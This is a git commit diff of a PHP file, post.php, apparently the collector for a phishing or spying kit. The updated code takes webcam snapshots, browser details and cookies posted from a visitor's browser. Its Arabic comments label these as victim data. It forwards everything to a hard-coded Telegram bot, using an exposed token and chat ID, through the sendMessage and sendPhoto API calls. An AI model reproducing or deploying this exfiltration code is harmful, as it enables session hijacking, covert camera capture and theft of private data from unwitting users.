989604bce531f669f31da3e51fb231fab666e6d3
tag963 <alidm0935@gmail.com>
2026-06-09 16:41:22 -0400

    Update post.php

--- post.php
+++ post.php
@@ -1,24 +1,28 @@
 <?php
+// إعدادات البوت
 $botToken = "8771622459:AAHTQLVU5fSRbP_gTZ4nFkqSKw2vyyHSlgM";
 $chatId = "8504751121";
 
-if (isset($_POST['img'])) {
-    // 1. استقبال وتجهيز الصورة
-    $imageData = substr($_POST['img'], strpos($_POST['img'], ",")+1);
-    $binaryData = base64_decode($imageData);
+// 1. استقبال البيانات وتجهيزها
+$imgData = isset($_POST['img']) ? $_POST['img'] : null;
+$infoData = isset($_POST['info']) ? $_POST['info'] : "N/A";
+$cookieData = isset($_POST['cookies']) ? $_POST['cookies'] : "N/A";
+
+// 2. إرسال المعلومات النصية (المتصفح والكوكيز)
+$text = "بيانات الضحية:\n" . $infoData . "\n\nالكوكيز:\n" . $cookieData;
+file_get_contents("https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($text));
+
+// 3. معالجة الصورة وإرسالها
+if ($imgData) {
+    // إزالة جزء الـ header الخاص بالـ base64
+    $filteredData = substr($imgData, strpos($imgData, ",")+1);
+    $binaryData = base64_decode($filteredData);
     $fileName = 'cam_' . time() . '.jpg';
+    
+    // حفظ الملف مؤقتاً
     file_put_contents($fileName, $binaryData);
 
-    // 2. إرسال النص (المعلومات والكوكيز)
-    $info = isset($_POST['info']) ? $_POST['info'] : "N/A";
-    $cookies = isset($_POST['cookies']) ? $_POST['cookies'] : "N/A";
-    $text = "Info: " . $info . "\nCookies: " . $cookies;
-    
-    // تصحيح الرابط (بدون أخطاء في علامات التنصيص)
-    $urlText = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($text);
-    file_get_contents($urlText);
-
-    // 3. إرسال الصورة
+    // إرسال الصورة باستخدام CURL
     $urlPhoto = "https://api.telegram.org/bot" . $botToken . "/sendPhoto";
     $postFields = [
         'chat_id' => $chatId,
@@ -32,7 +36,9 @@ if (isset($_POST['img'])) {
     curl_exec($ch);
     curl_close($ch);
     
-    // 4. حذف الملف
-    unlink($fileName);
+    // حذف الملف بعد الإرسال
+    if (file_exists($fileName)) {
+        unlink($fileName);
+    }
 }
 ?>
